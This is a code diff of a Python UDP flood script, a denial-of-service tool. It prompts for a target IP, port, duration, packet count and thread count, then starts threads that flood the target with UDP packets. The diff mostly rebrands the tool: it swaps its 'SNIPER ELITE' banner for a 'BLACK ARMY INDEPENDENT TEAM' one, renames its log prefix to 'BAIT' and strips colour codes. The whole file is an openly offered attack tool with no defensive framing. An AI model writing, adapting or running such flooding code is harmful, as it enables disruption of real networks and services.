@@ -1,39 +1,37 @@
-# CHEK IMPORT
-try:
-    import socket
-    import threading
-    import os
-    import sys
-    import time
-    import random
+import socket
+import threading
+import os
+import sys
+import time
+import random
 
 # Clear terminal screen
 os.system('clear')
 
-#DATA
-banner = f"""
-{Fore.YELLOW}|:::::::::::|                                             / ::
-{Fore.YELLOW}———— ::————/     ___   ____    ____   ___   ____         | ::
-{Fore.WHITE}| ;:\ ::    / ::|/:::::\  /:::::\ | ::: | ::          | ::
-{Fore.WHITE}| :: \ :: :: :: / :: | ::/ :: | ::| :: :: ::  _____   | ::
-{Fore.WHITE}| ::  \ ::  ::  | :::::/ | :::::/ | :: \ :::  |::::|  | ::::::
-{Fore.LIGHTYELLOW_EX}\__   \__/\__   \_____/  \_____/ |___  \___          \________
-                                                               
-{Fore.RED}||_________[[ BEIGADE ATTACKER SNIPER ELITE  ** By:Kun99 ]]__________||
-{Fore.RESET}"""
- 
-print(banner)
-host = ""
-ip = ""
+# Function to display banner
+def display_banner():
+    banner = """
+            _____       ___      ___  ___________
+           /$$$$$$\\    / $$$    / $$ /$$$$$$$$$$
+          | $$__|$$|  / $$\\$$   | $$ |——— $$
+          | $$$$$$/  / $$  \\$$  | $$    | $$
+          | $$__|$$|/ $$$$$$$$$ | $$    | $$
+          | $$$$$$// $$——————\\$$| $$    | $$
+          \\——————/\\———|      |——|\\__|    \\——|
+       |————————————————————————————————————————|
+       | BLACK ARMY INDEPENDENT TEAM ** By:Kun99 |
+    """
+    print(banner)
 
+# Prompt user for input
 def get_user_input():
     print(" +======================================================+")
-    target_ip = input(f"{Fore.LIGHTHYELLOW_EX} | Target IP : ").strip()
-    target_port = input(f"{Fore.YELLOW} | Target Port : ").strip()
-    attack_time = input(f"{Fore.RED} | Time (seconds) : ").strip()
-    packet = input(f"{Fore.LIGHTGREEN_EX} | Packet : ").strip()
-    thread_count = input(f"{Fore.LIGHTCYAN_EX} | Thread : ").strip()
-    method = input(f"{Fore.CYAN} | Method (UDP/TCP & UDP Mix) : ").strip().lower()
+    target_ip = input(" | Target IP : ").strip()
+    target_port = input(" | Target Port : ").strip()
+    attack_time = input(" | Time (seconds) : ").strip()
+    packet = input(" | Packet : ").strip()
+    thread_count = input(" | Thread : ").strip()
+    method = input(" | Method (UDP/TCP & UDP Mix) : ").strip().lower()
     print(" ========================================================")
 
     return target_ip, int(target_port), int(attack_time), int(packet), int(thread_count), method
@@ -60,10 +58,10 @@ def udp_attack(ip, port, packet, duration, thread_count):
         try:
             for _ in range(packet):
                 s.sendto(data, (ip, port))
-            print(f"[SNIPER-ELITE] Attacking... >  time {duration} target {ip}:{port} packet {packet} threads {thread_count}")
+            print(f"[BAIT] Attacking... >  time {duration} target {ip}:{port} packet {packet} threads {thread_count}")
         except socket.error:
             s.close()
-            print("[SNIPER-ELITE] Error during attack, socket closed.")
+            print("[BAIT] Error during attack, socket closed.")
             break
 
 # Threaded attack function
@@ -73,7 +71,7 @@ def start_attack(target_ip, target_port, packet, thread_count, method, duration)
             th = threading.Thread(target=udp_attack, args=(target_ip, target_port, packet, duration, thread_count))
             th.start()
     else:
-        print(f"{Fore.MAGENTA}[SNIPER-ELITE] Unsupported method. Only UDP supported in this version.{Fore.LIGHTMAGENTA}{Fore.RESET}")
+        print("[BAIT] Unsupported method. Only UDP supported in this version.")
 
 # Main program flow
 def main():
@@ -88,6 +86,6 @@ if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
-        print("\n[SNIPER-ELITE] Attack interrupted. Exiting...")
+        print("\n[BAIT] Attack interrupted. Exiting...")
         sys.exit()
-
+                 
